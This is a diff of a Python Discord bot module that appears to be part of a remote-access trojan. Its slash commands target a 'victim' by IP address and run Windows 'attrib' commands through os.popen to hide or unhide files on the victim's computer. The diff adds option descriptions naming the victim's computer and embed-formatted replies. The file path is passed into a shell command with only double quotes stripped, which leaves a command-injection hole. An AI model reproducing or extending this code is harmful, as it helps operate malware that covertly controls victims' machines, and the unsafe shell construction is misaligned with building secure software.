@@ -10,25 +10,66 @@ class Hide(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(description="Hide file")
-    async def hidefile(ctx, victim, file):
-        if str(victim) == str(ip_addr): 
+    @commands.slash_command(
+        description="Hide file on victim's computer",
+        options=[
+            discord.Option("victim", description="IP Address of specific victim", required=True),
+            discord.Option("file", description="File path of the file to be hidden", required=True),
+        ],
+    )
+    async def hidefile(self, ctx, victim, file):
+        if str(victim) == str(self.ip_addr): 
             if '"' in file:
                 file = file.replace('"','')
+                
             output = os.popen("attrib +h " + '"' + file + '"').read()
-            if "not" in output: return await ctx.response.send_message("Unable to hide file. Check path and try again")
             
-            await ctx.response.send_message("File hidden successfully")
+            if "not" in output: 
+                return await ctx.response.send_message(
+                    embed = self.bot.genEmbed(
+                        "Unable to hide file!", 
+                        datetime.now(),
+                        "Ensure the file path is correct and try again"
+                    )
+                )
                         
-    @commands.slash_command(description="Unhide file")
-    async def unhidefile(ctx, victim, file):
-        if str(victim) == str(ip_addr): 
+            await ctx.response.send_message(
+                embed = self.bot.genEmbed(
+                    "File hidden successfully!",
+                    datetime.now(),
+                    "Path:\n```"+file+"```"
+                )
+            )                        
+    @commands.slash_command(
+        description="Unhide file on victim's computer",
+        options=[
+            discord.Option("victim", description="IP Address of specific victim", required=True),
+            discord.Option("file", description="File path of the file to be unhidden", required=True),
+        ],
+    )
+    async def unhidefile(self, ctx, victim, file):
+        if str(victim) == str(self.ip_addr): 
             if '"' in file:
                 file = file.replace('"','')
+                
             output = os.popen("attrib -h " + '"' + file + '"').read()
-            if "not" in output: return await ctx.response.send_message("Unable to show file. Check path and try again")
             
-            await ctx.response.send_message("File unhidden successfully")
+            if "not" in output: 
+                return await ctx.response.send_message(
+                    embed = self.bot.genEmbed(
+                        "Unable to show file!", 
+                        datetime.now(),
+                        "Ensure the file path is correct and try again"
+                    )
+                )
+            
+            await ctx.response.send_message(
+                embed = self.bot.genEmbed(
+                    "File unhidden successfully!",
+                    datetime.now(),
+                    "Path:\n```"+file+"```"
+                )
+            )
             
 def setup(bot: commands.Bot):
     bot.add_cog(Hide(bot))
